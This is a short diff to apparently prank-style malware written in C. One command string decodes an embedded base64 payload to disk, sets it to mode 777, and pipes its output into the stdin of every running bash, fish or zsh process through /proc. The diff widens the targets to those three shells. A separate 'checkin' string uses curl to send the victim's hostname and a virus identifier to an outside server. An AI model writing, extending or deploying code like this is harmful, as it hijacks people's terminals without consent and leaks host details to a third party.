@@ -12,7 +12,7 @@
 char *cmd = "/bin/echo "
 #include "song/song_b64.txt"
 " | /usr/bin/base64 -d > " FILENAME "; /bin/chmod 777 " FILENAME "; "
-"/usr/bin/pgrep -f bash | /usr/bin/xargs /usr/bin/printf '/proc/%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file &'";
+"/usr/bin/pgrep -f 'bash|fish|zsh' | /usr/bin/xargs /usr/bin/printf '/proc/%d/fd/0\n' | /usr/bin/xargs -I file /bin/sh -c '" FILENAME " > file &'";
 
 char *checkin = "curl -XGET http://monitor.daviddworken.com:8080/api/submit?id=`hostname`&virusName=4";
 
